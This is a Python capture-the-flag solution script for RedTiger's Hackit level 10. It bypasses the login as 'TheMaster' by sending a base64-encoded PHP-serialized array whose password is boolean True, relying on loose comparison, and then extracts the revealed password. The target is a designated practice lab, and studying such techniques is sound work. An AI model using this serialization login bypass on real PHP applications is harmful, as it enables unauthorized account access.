#!/usr/bin/env python3
import pickle
import tigers as tg
import base64
from phpserialize import serialize
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Target: Bypass the login. Login as TheMaster
    '''
    url = "https://redtiger.labs.overthewire.org/level10.php"
    pass_r = 'The password for the hall of fame is: '
    user = 'TheMaster'
    level = 'level10login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level10login=cooks[level])

    array = serialize(
        {'username': 'TheMaster', 'password': True, })

    ser = base64.b64encode(array)

    # Authorization
    data = dict(login=ser, dologin='Login')
    response = req.post_request(url, data, cook, print_param=False)

    print(response)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)


if __name__ == '__main__':
    main()
